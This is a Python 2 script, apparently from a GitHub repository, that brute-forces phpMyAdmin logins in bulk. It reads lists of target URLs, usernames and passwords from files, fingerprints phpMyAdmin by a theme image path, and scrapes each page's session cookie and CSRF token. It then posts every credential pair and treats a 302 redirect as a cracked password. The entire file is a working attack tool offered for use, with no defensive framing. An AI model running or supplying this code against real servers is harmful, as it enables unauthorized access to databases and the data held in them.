#!usr/bin/env python
# encoding: utf-8
"""
@Time ： 2021-08-15
@Auth ： zengxin&whm
@File ：phpMyAdmin_brute.py
@Describe: 此工具用来批量爆破phpMyAdmin页面用户名密码，Github link：https://github.com/ppu-zengxin/phpMyAdmin_brute
"""

import requests
import sys
import re
import HTMLParser

flag = 0

def getpassword(host, username, password):
    global flag
    ss=requests.session()
    r = ss.get(host)
    tmpsession = re.findall(r'phpMyAdmin=(.*?);', r.headers['Set-Cookie'])
    left = r.content.rfind('name="token" value="')
    tmp = r.content[left + 20:]
    right = tmp.find('"')
    token = tmp[:right]
    # print token
    http_parser = HTMLParser.HTMLParser();
    token = http_parser.unescape(token);
    post_data = {"set_session": tmpsession[-1], "pma_username": username, "pma_password": password, "server": "1",
                 "target": "index.php", "token": token}
    r2 = ss.post(host, data=post_data, allow_redirects=False)
    # print post_data
    if r2.status_code == 302:
        print "\nFind PASSWORD!!!!!!{0}的用户是{1},密码是{2}".format(host, username, password)
        flag = 1


with open('url.txt', 'r') as url:
    host_t = url.readlines()
    with open('username.txt', 'r') as username:
        username_t = username.readlines()
        with open('password.txt', 'r') as password:
            password_t = password.readlines()
            for h in host_t:
                host = h.strip(' /')
                print host
                ss2 = requests.session()
                r = ss2.get(host)
                print r.text
                if "./themes/pmahomme/img/logo_right.png" in r.text:
                    if "index.php" not in host:
                        host = host.strip('/')
                        host = host + "/index.php"
                        for u in username_t:
                            username = u.strip()
                            if flag == 1:
                                flag = 0
                                break
                            else:
                                for p in password_t:
                                    if flag == 1:
                                        break
                                    else:
                                        password = p.strip()
                                        sys.stdout.write(
                                            "\r" + "正在检测" + host + "   用户名: " + username + "    密码: " + password)
                                        sys.stdout.flush()
                                        getpassword(host, username, password)
                else:
                    print "\n%s不是phpMyAdmin网站" % host
                    continue


    print "\n"